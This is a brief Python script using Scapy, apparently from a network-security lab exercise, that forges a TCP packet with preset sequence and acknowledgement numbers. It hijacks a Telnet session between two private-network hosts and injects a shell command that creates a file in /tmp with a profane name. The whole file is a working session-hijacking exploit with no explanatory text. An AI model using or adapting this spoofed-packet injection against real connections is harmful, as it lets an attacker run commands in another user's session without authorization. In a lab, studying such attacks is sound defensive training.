#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6",dst="10.9.0.7")
tcp= TCP(sport=39028,dport=23,flags="A",seq=1270590880,ack=2887696740)
data="\n touch /tmp/fuckyou \n"
pkt=ip/tcp/data
ls(pkt)
send(pkt)
